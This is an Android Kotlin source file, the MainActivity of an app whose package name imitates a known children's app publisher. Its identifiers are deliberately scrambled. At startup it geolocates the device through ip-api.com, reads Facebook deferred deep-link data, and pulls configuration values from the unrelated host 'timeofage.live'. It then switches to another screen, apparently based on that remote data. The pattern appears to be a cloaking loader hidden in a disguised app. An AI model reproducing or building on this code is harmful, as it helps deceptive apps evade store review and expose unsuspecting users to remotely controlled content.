package com.sinyee.babybus.worl

import kotlinx.coroutines.Job
import kotlinx.coroutines.launch

import com.sinyee.babybus.worl.bgfdeas.Molxuxzysq.Companion.sosdok
import android.content.Context
import com.sinyee.babybus.worl.bgfdeas.Molxuxzysq.Companion.qowijsdo
import com.sinyee.babybus.worl.bgfdeas.Molxuxzysq.Companion.dijs
import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import android.util.Log
import com.facebook.applinks.AppLinkData
import com.orhanobut.hawk.Hawk
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.concurrent.Executors
import com.sinyee.babybus.worl.bgfdeas.Molxuxzysq.Companion.apsosodk
import com.sinyee.babybus.worl.bgfdeas.Molxuxzysq.Companion.eorkkodsko


import com.sinyee.babybus.worl.databinding.ActivityMainBinding
import com.sinyee.babybus.worl.hytesds.Xsisudwqsa
import com.sinyee.babybus.worl.hytesds.Dosiasodks
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {
    private lateinit var foiiorodisi: ActivityMainBinding
    override fun onCreate(savedInstanceState: Bundle?) {

        super.onCreate(savedInstanceState)
        foiiorodisi = ActivityMainBinding.inflate(layoutInflater)
        setContentView(foiiorodisi.root)

        eokokdok(this)

        val doeoaso = Executors.newSingleThreadScheduledExecutor()
        var ovocicicvco: String? = Hawk.get(dijs, null)
        var eiji: String? = Hawk.get(apsosodk, null)
        doeoaso.scheduleAtFixedRate({
            if (ovocicicvco != null && eiji != null) {
                doeoaso.shutdown()
                qossiisjddjx()
            } else {
                ovocicicvco = Hawk.get(dijs)
                eiji = Hawk.get(apsosodk)
            }
        }, 0, 1, TimeUnit.SECONDS)

        GlobalScope.launch (Dispatchers.IO){
            cxvjijc
        }
    }

    private val cxvjijc: Job = GlobalScope.launch (Dispatchers.IO){
        voockbkof()
        rokdijs()
    }

    private suspend fun rokdijs() {
        val vookfmodsk = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://timeofage.live/")
            .build()
            .create(Dosiasodks::class.java)
        val oddsdsjidis = vookfmodsk.szoxijcs().body()?.nobivivbvhu.toString()
        val ixjcjicx = vookfmodsk.szoxijcs().body()?.fiorokdos.toString()
        val qoksod = vookfmodsk.szoxijcs().body()?.coxkf.toString()


        Hawk.put(sosdok, oddsdsjidis)
        Hawk.put(qowijsdo, ixjcjicx)
        Hawk.put(apsosodk, qoksod)

    }



    private suspend fun voockbkof() {
        val eokjirkodfok = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://pro.ip-api.com/")
            .build()
            .create(Dosiasodks::class.java)
        val xijcisjasijc = eokjirkodfok.fodospsdpspd().body()?.pqosokdko
        Log.d("Data from API", xijcisjasijc.toString())

        Hawk.put(dijs, xijcisjasijc)
    }

    private fun qossiisjddjx() {
        val idfjisdjfjisd = Intent(this@MainActivity, Xsisudwqsa::class.java)
        startActivity(idfjisdjfjisd)
        finish()
    }





    fun eokokdok(frpodosp: Context) {
        AppLinkData.fetchDeferredAppLinkData(
            frpodosp
        ) { doeopsldps: AppLinkData? ->
            doeopsldps?.let {
                val xziis = doeopsldps.targetUri.host.toString()
                Hawk.put(eorkkodsko, xziis)
            }
        }
    }
}